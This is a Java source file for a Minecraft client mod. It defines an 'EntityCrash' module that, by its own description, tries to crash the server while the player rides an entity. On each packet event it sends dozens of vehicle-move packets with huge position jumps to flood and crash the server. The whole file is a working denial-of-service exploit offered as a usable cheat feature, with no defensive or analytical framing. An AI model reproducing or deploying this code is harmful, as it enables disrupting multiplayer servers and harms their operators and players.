package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

public class EntityCrash extends Feature {

    public final Property<Integer> speedProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Speed")
            .value(1400)
            .min(1)
            .max(10000)
            .inc(100)
            .build();
    public final Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Packet Count")
            .value(24)
            .min(1)
            .max(50)
            .inc(1)
            .build();
    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Auto Disable")
            .value(true)
            .build();

    public EntityCrash() {
        super(CrashPlugin.CRASH, "Tries to crash the server when you are riding an entity. (By 0x150)");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        Entity entity = Wrapper.INSTANCE.getLocalPlayer().getVehicle();
        if (entity == null) {
            ChatHelper.INSTANCE.addClientMessage("ERROR! You must be riding an entity for this!");
            setState(false);
            return;
        }
        for (int i = 0; i < packetCountProperty.value(); i++) {
            Vec3d v = entity.getPos();
            entity.setPos(v.x, v.y + speedProperty.value(), v.z);
            VehicleMoveC2SPacket packet = new VehicleMoveC2SPacket(entity);
            NetworkHelper.INSTANCE.sendPacket(packet);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));
}
